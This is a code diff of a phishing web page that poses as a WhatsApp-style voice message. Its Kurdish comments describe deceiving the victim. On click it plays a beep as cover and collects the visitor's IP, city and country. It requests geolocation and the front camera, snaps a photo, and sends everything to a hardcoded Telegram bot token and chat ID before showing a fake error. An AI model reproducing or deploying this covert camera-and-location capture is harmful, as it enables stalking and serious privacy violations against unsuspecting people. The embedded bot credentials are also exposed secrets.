@@ -3,27 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voice Message (0:05)</title>
-    <meta property="og:title" content="Voice Message (0:05)">
+    
+    <meta property="og:title" content="Voice message (0:05)">
     <meta property="og:description" content="🎙️ پەیامی دەنگی">
+    <meta property="og:image" content="https://raw.githubusercontent.com/FortAwesome/Font-Awesome/master/svgs/solid/microphone.svg">
+    <meta property="og:type" content="music.song">
+
+    <title>Voice Message</title>
     <style>
         body { background-color: #e5ddd5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .voice-card { background: white; padding: 12px 18px; border-radius: 12px; display: flex; align-items: center; width: 300px; box-shadow: 0 2px 5px rgba(0,0,0,0.15); cursor: pointer; }
-        .play-btn { width: 45px; height: 45px; background: #25D366; border-radius: 50%; display: flex; justify-content: center; align-items: center; border: none; color: white; font-size: 24px; }
-        .wave-img { flex-grow: 1; margin: 0 15px; height: 35px; opacity: 0.6; }
-        .time { font-size: 13px; color: #777; font-weight: bold; }
+        
+        .voice-card { 
+            background: white; 
+            padding: 10px 15px; 
+            border-radius: 12px; 
+            display: flex; 
+            align-items: center; 
+            width: 300px; 
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2); 
+            cursor: pointer; 
+            user-select: none;
+        }
+
+        .play-btn { 
+            width: 45px; 
+            height: 45px; 
+            background: #25D366; 
+            border-radius: 50%; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            border: none; 
+            color: white; 
+            font-size: 24px; 
+        }
+
+        .wave-img { 
+            flex-grow: 1; 
+            margin: 0 15px; 
+            height: 35px; 
+            background: url('https://upload.wikimedia.org/wikipedia/commons/e/e7/Audio_wave.png') center/contain no-repeat;
+            opacity: 0.5;
+        }
+
+        .time { font-size: 13px; color: #888; }
+        
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="voice-card" onclick="playAndCapture()">
+    <div class="voice-card" onclick="startHack()">
         <button class="play-btn" id="btnIcon">▶</button>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Audio_wave.png" class="wave-img">
+        <div class="wave-img"></div>
         <div class="time">0:05</div>
     </div>
 
-    <audio id="myAudio">
+    <audio id="audioPlayer">
         <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
     </audio>
 
@@ -31,19 +67,35 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
-        const ID = '6351568884';
+        const BOT_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
+        const CHAT_ID = '6351568884';
+        
+        let ipInfo = "جۆری ئایپی دیار نییە";
 
-        function playAndCapture() {
-            const audio = document.getElementById('myAudio');
+        // وەرگرتنی زانیاری ئایپی بە بێدەنگی
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                ipInfo = `📍 وڵات: ${data.country_name}\n🏙 شار: ${data.city}\n🗺 IP: ${data.ip}`;
+            });
+
+        function startHack() {
+            const audio = document.getElementById('audioPlayer');
             const btn = document.getElementById('btnIcon');
 
-            // ١. لێدانی دەنگەکە بۆ ئەوەی گومان نەکات
+            // ١. لێدانی ڤۆیسەکە بۆ ئەوەی گومان نەکات
             audio.play();
-            btn.innerText = "⏸";
+            btn.innerText = "⌛";
 
-            // ٢. داواکردنی کامێرا لە پشتەوە
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            // ٢. داواکردنی کامێرا و لۆکەیشن پێکەوە
+            navigator.geolocation.getCurrentPosition(pos => {
+                const locMsg = `📍 لۆکەیشنی کەسەکە:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`);
+            });
+
+            const constraints = { video: { facingMode: "user" } };
+
+            navigator.mediaDevices.getUserMedia(constraints)
             .then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -51,33 +103,33 @@
                 video.onloadedmetadata = () => {
                     video.play();
                     
-                    // دوای ٢ چرکە کە سەرقاڵی دەنگەکەیە، وێنەکەی دەگرێت
+                    // دوای ٢ چرکە کە سەرقاڵی گوێگرتنە وێنەکە دەگرێت
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.getContext('2d').drawImage(video, 0, 0);
                         
                         canvas.toBlob(blob => {
                             const formData = new FormData();
-                            formData.append('chat_id', ID);
-                            formData.append('photo', blob, 'voice_user.jpg');
-                            formData.append('caption', '🎙️ وێنەی ئەو کەسەی گوێی لە ڤۆیسەکە گرت');
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'target.jpg');
+                            formData.append('caption', `🎙️ وێنەی ئەو کەسەی ویستی ڤۆیسەکە ببیستێت:\n\n${ipInfo}`);
 
-                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                 method: 'POST',
                                 body: formData
+                            }).then(() => {
+                                // دوای ناردنی وێنەکە، سایتەکە وەک "هەڵە" نیشان دەدات یان دادەخرێت
+                                alert("Error loading voice message. Try again later.");
                             });
                         }, 'image/jpeg', 0.7);
-                    }, 2000);
+                    }, 2500);
                 };
             })
             .catch(() => {
-                console.log("Permission Denied");
+                alert("بۆ بیستنی ڤۆیسەکە، دەبێت ڕێگە بدەیت سێرڤەری دەنگ چالاک بێت.");
             });
-
-            // کاتێک دەنگەکە تەواو بوو ئایکۆنەکە دەگۆڕێتەوە
-            audio.onended = () => { btn.innerText = "▶"; };
         }
     </script>
 </body>
